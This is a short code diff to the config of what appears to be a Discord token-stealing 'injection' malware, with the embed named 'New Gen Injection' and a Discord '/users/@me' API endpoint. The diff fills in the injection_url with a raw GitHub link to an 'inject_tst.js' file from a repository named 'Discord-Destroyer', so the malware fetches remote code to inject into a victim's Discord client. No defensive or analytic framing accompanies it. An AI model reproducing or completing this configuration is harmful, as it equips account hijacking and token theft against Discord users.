@@ -14,7 +14,7 @@ const config = {
   embed_name: 'New Gen Injection', 
   embed_icon: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQnc59_hDTy-585XoDnWshqr0lU1ZeJ6lIo9w&usqp=CAU', 
   embed_color: 0, 
-  injection_url: 'url_here', 
+  injection_url: 'https://raw.githubusercontent.com/DARKNOSY/Discord-Destroyer/main/Discord-Destroyer/src/inject_tst.js', 
 
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
